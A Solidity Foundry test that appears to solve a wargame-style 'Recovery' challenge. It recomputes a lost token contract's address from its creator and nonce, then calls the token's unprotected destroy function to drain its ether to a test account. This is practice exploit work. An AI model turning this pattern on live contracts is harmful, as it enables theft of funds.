pragma solidity ^0.8.0;

import {Recovery, SimpleToken} from "../src/recovery/Recovery.sol";

import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";

contract RecoveryTest is Test {
    Recovery public sc;
    SimpleToken public simpleToken;
    function setUp() public {
        sc = new Recovery();
        sc.generateToken("simple", 50000000);
        address payable temp = _calculateAddress(address(sc));
        uint256 size;
        assembly {
            size := extcodesize(temp)
        }
        assertNotEq(size, 0);
        simpleToken = SimpleToken(temp);
        assertEq(simpleToken.balances(address(this)), 50000000);
        // send eth
        (bool success, bytes memory message) = address(simpleToken).call{value: 0.001 ether}("");
        if(!success) {
            assembly {
                message := add(message, 68)
            }
            revert(string(message));
        }

    }

    function test_Hack() public {
        // calculate the address of simple token
        assertEq(account.ACC_0.balance, 0);
        simpleToken.destroy(payable(account.ACC_0));
        assertEq(account.ACC_0.balance, 0.001 ether);
    }

    function _calculateAddress(address creator) private pure returns (address payable) {
        return
            payable(address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                uint8(0xd6), // 固定值
                                uint8(0x94), // 固定值
                                creator, //创建者地址
                                uint8(0x01) // 创建者创建该合约的nonce值，合约地址nonce值从1开始算（eip-161），如果是eoa账户，nonce为零时，此值为0x80
                            )
                        )
                    )
                )
            ));
    }

    receive() external payable {}
}
